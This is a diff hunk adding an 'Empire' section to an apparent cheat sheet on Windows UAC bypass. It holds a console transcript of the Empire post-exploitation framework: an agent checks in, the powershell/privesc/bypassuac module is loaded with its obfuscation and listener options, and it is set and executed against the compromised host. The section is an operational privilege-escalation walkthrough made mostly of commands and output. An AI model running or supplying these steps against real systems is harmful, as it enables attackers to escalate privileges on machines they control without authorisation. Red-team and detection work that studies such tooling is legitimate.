@@ -448,7 +448,81 @@ eventvwr-bypassuac-64.exe
 eventvwr-bypassuac-32.exe
 ```
 
+## Empire
+```
+Here's an example of how to use the bypassuac module in the Empire client console:
+[+] New agent Y4LHEV83 checked in
+[*] Sending agent (stage 2) to Y4LHEV83 at 192.168.204.135
+(empire usestager/windows/ducky) > usemodule powershell/privesc/bypassuac
 
+ Author       Leo Davidson                                                           
+              @meatballs__                                                           
+              @TheColonial                                                           
+              @mattifestation                                                        
+              @harmyj0y                                                              
+              @sixdub                                                                
+ Background   True                                                                   
+ Comments     https://github.com/mattifestation/PowerSploit/blob/master/CodeExecutio 
+              n/Invoke--Shellcode.ps1                                                
+              https://github.com/rapid7/metasploit-framework/blob/master/modules/exp 
+              loits/windows/local/bypassuac_injection.rb                             
+              https://github.com/rapid7/metasploit-framework/tree/master/external/so 
+              urce/exploits/bypassuac_injection/dll/src                              
+              http://www.pretentiousname.com/                                        
+ Description  Runs a BypassUAC attack to escape from a medium integrity process to a 
+              high integrity process. This attack was originally discovered by Leo   
+              Davidson. Empire uses components of MSF's bypassuac injection          
+              implementation as well as an adapted version of PowerSploit's Invoke-- 
+              Shellcode.ps1 script for backend lifting.                              
+ Language     powershell                                                             
+ Name         powershell/privesc/bypassuac                                           
+ NeedsAdmin   False                                                                  
+ OpsecSafe    False                                                                  
+ Techniques   http://attack.mitre.org/techniques/T1088                               
+
+
+,Record Options----,--------------------,----------,-------------------------------------,
+| Name             | Value              | Required | Description                         |
+|------------------|--------------------|----------|-------------------------------------|
+| Agent            |                    | True     | Agent to run module on.             |
+|------------------|--------------------|----------|-------------------------------------|
+| Bypasses         | mattifestation etw | False    | Bypasses as a space separated list  |
+|                  |                    |          | to be prepended to the launcher.    |
+|------------------|--------------------|----------|-------------------------------------|
+| Listener         |                    | True     | Listener to use.                    |
+|------------------|--------------------|----------|-------------------------------------|
+| Obfuscate        | False              | False    | Switch. Obfuscate the launcher      |
+|                  |                    |          | powershell code, uses the           |
+|                  |                    |          | ObfuscateCommand for obfuscation    |
+|                  |                    |          | types. For powershell only.         |
+|------------------|--------------------|----------|-------------------------------------|
+| ObfuscateCommand | Token\All\1        | False    | The Invoke-Obfuscation command to   |
+|                  |                    |          | use. Only used if Obfuscate switch  |
+|                  |                    |          | is True. For powershell only.       |
+|------------------|--------------------|----------|-------------------------------------|
+| Proxy            | default            | False    | Proxy to use for request (default,  |
+|                  |                    |          | none, or other).                    |
+|------------------|--------------------|----------|-------------------------------------|
+| ProxyCreds       | default            | False    | Proxy credentials                   |
+|                  |                    |          | ([domain\]username:password) to use |
+|                  |                    |          | for request (default, none, or      |
+|                  |                    |          | other).                             |
+|------------------|--------------------|----------|-------------------------------------|
+| UserAgent        | default            | False    | User-agent string to use for the    |
+|                  |                    |          | staging request (default, none, or  |
+|                  |                    |          | other).                             |
+'------------------'--------------------'----------'-------------------------------------'
+
+(Empire: usemodule/powershell/privesc/bypassuac) > set Agent Y4LHEV83
+[*] Set Agent to Y4LHEV83
+(Empire: usemodule/powershell/privesc/bypassuac) > set Listener listener1
+[*] Set Listener to listener1
+(Empire: usemodule/powershell/privesc/bypassuac) > execute
+[*] Tasked Y4LHEV83 to run Task 1
+...
+
+Now wait for the results to come.
+```
 
 
 
